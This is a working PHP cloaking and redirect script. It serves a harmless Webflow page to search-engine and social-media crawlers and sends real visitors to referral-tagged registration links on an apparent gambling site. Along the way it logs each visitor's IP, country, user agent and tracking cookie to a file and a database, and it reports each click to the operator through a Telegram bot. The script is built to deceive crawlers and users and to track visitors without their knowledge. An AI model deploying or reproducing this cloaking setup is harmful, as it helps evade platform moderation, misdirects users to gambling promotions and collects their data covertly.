<?php

// Load environment variables from a local .env file if present
$envFile = __DIR__ . '/../.env';
if (is_readable($envFile)) {
    foreach (parse_ini_file($envFile, false, INI_SCANNER_RAW) as $key => $value) {
        if (getenv($key) === false) {
            putenv("{$key}={$value}");
            $_ENV[$key] = $value;
        }
    }
}

// ── CONFIGURATIONS ──────────────────────────────────────────────────────────
$telegramEnabled = true; // Set to false to disable notifications
$telegramToken  = getenv('TELEGRAM_TOKEN') ?: '';
$telegramChatId = getenv('TELEGRAM_CHAT_ID') ?: '';

// Webflow page for bots
$webflowUrl = getenv('WEBFLOW_URL') ?: 'https://arms.nexonova.net';

// Redirect targets for real users (comma-separated env or defaults)
$redirectLinks = getenv('REDIRECT_LINKS')
    ? array_map('trim', explode(',', getenv('REDIRECT_LINKS')))
    : [
        'https://hiso8888.com/?action=register&marketingRef=67a38f0e3a07cb6c14c41776',
        'https://hiso8888.com/?action=register&marketingRef=67bd6d30e679dd97f463538a',
    ];

// Default UTM values (overridable via env)
$utmSource         = getenv('UTM_SOURCE') ?: 'hpanel.hostinger.com';
$utmMedium         = getenv('UTM_MEDIUM') ?: 'redirect';
$utmCampaignPrefix = getenv('UTM_CAMPAIGN_PREFIX') ?: 'promo';

// Database configuration via environment variables
$dbHost     = getenv('DB_HOST') ?: 'localhost';
$dbName     = getenv('DB_NAME') ?: '';
$dbUser     = getenv('DB_USER') ?: '';
$dbPassword = getenv('DB_PASSWORD') ?: '';

// ── HELPER FUNCTIONS ────────────────────────────────────────────────────────

function writeLogFile(array $data): void {
    $logDir = __DIR__ . '/logs';
    if (!is_dir($logDir)) {
        mkdir($logDir, 0777, true);
    }
    $logLine = implode("\t", [
        date('Y-m-d H:i:s'),
        $data['ip'],
        $data['country'],
        str_replace(["\r", "\n"], ' ', $data['ua']),
        $data['trackingId'],
        $data['redirectUrl']
    ]) . "\n";
    file_put_contents($logDir . '/click_log.txt', $logLine, FILE_APPEND | LOCK_EX);
}

function getDb(): PDO {
    global $dbHost, $dbName, $dbUser, $dbPassword;
    if (!$dbName || !$dbUser) {
        throw new RuntimeException('Database credentials are not set');
    }
    static $pdo = null;
    if ($pdo === null) {
        $dsn = "mysql:host={$dbHost};dbname={$dbName};charset=utf8mb4";
        $pdo = new PDO($dsn, $dbUser, $dbPassword, [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]);
    }
    return $pdo;
}

function getUserIP(): string {
    $keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = trim(current(explode(',', $_SERVER[$key])));
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    return '0.0.0.0';
}

function isBot(string $ua): bool {
    $bots = [
        'googlebot', 'bingbot', 'slurp', 'duckduckgo', 'baiduspider', 'yandexbot',
        'facebookexternalhit', 'twitterbot', 'rogerbot', 'linkedinbot', 'embedly',
        'pinterest', 'slackbot', 'telegrambot', 'applebot', 'semrushbot', 'ahrefsbot'
    ];
    $ua = strtolower($ua);
    foreach ($bots as $bot) {
        if (strpos($ua, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function proxyRequest(string $url): void {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_USERAGENT      => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0',
        CURLOPT_SSL_VERIFYPEER => true,
    ]);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        http_response_code(502);
        error_log('Proxy error: ' . curl_error($ch));
        curl_close($ch);
        exit;
    }
    $httpCode    = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);

    if ($httpCode !== 200) {
        http_response_code($httpCode);
        error_log("Proxy target responded with HTTP {$httpCode}");
        exit;
    }

    $allowed = ['text/html', 'application/json'];
    $baseType = $contentType ? explode(';', $contentType)[0] : '';
    if ($baseType && in_array($baseType, $allowed, true)) {
        header("Content-Type: {$contentType}");
    }
    echo $response;
}

function getUserCountry(string $ip): string {
    $default = 'TH';
    $apiUrl  = "https://ip-api.com/json/{$ip}?fields=countryCode";
    $ch = curl_init($apiUrl);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 5,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);
    $result = curl_exec($ch);
    if ($result === false) {
        error_log('IP API error: ' . curl_error($ch));
        curl_close($ch);
        return $default;
    }
    curl_close($ch);
    $data = json_decode($result, true);
    return $data['countryCode'] ?? $default;
}

function sendTelegram(string $message): void {
    global $telegramToken, $telegramChatId;
    if (!$telegramToken || !$telegramChatId) {
        return;
    }
    $apiUrl = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    $postData = [
        'chat_id'    => $telegramChatId,
        'text'       => $message,
        'parse_mode' => 'HTML',
    ];
    $ch = curl_init($apiUrl);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $postData,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 5,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

// ── MAIN PROCESS ────────────────────────────────────────────────────────────

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = getUserIP();

if (isBot($ua)) {
    proxyRequest($webflowUrl);
    exit;
}

if (empty($_COOKIE['tracking_id'])) {
    $trackingId = bin2hex(random_bytes(8));
    setcookie('tracking_id', $trackingId, [
        'expires'  => time() + 30 * 24 * 3600,
        'path'     => '/',
        'secure'   => true,
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
} else {
    $trackingId = $_COOKIE['tracking_id'];
}

$link        = $redirectLinks[array_rand($redirectLinks)];
$utmCampaign = $utmCampaignPrefix . '_' . date('Ymd') . '_' . bin2hex(random_bytes(4));
$utmParams   = [
    'utm_source'   => $utmSource,
    'utm_medium'   => $utmMedium,
    'utm_campaign' => $utmCampaign,
];
$separator   = strpos($link, '?') === false ? '?' : '&';
$redirectUrl = $link . $separator . http_build_query($utmParams);

$country = getUserCountry($ip);

writeLogFile([
    'ip'          => $ip,
    'country'     => $country,
    'ua'          => $ua,
    'trackingId'  => $trackingId,
    'redirectUrl' => $redirectUrl,
]);

try {
    $pdo  = getDb();
    $stmt = $pdo->prepare(
        'INSERT INTO click_logs (created_at, ip, country, user_agent, tracking_id, redirect_url, utm_source, utm_medium, utm_campaign) '
        . 'VALUES (NOW(), :ip, :country, :ua, :tid, :url, :src, :med, :camp)'
    );
    $stmt->execute([
        ':ip'   => $ip,
        ':country' => $country,
        ':ua'   => $ua,
        ':tid'  => $trackingId,
        ':url'  => $redirectUrl,
        ':src'  => $utmSource,
        ':med'  => $utmMedium,
        ':camp' => $utmCampaign,
    ]);
} catch (Throwable $e) {
    error_log('DB Error: ' . $e->getMessage());
}

if ($telegramEnabled) {
    $msg  = "<b>การแจ้งเตือนการคลิกใหม่</b>\n";
    $msg .= "🕒 Time: " . date('Y-m-d H:i:s') . "\n";
    $msg .= "🌐 IP: {$ip}\n";
    $msg .= "🏳️ Country: {$country}\n";
    $msg .= "📱 UA: " . htmlspecialchars($ua, ENT_QUOTES) . "\n";
    $msg .= "🔗 Redirect: {$redirectUrl}\n";
    $msg .= "🆔 TrackingID: {$trackingId}\n";
    sendTelegram($msg);
}

header("Location: {$redirectUrl}");
exit;
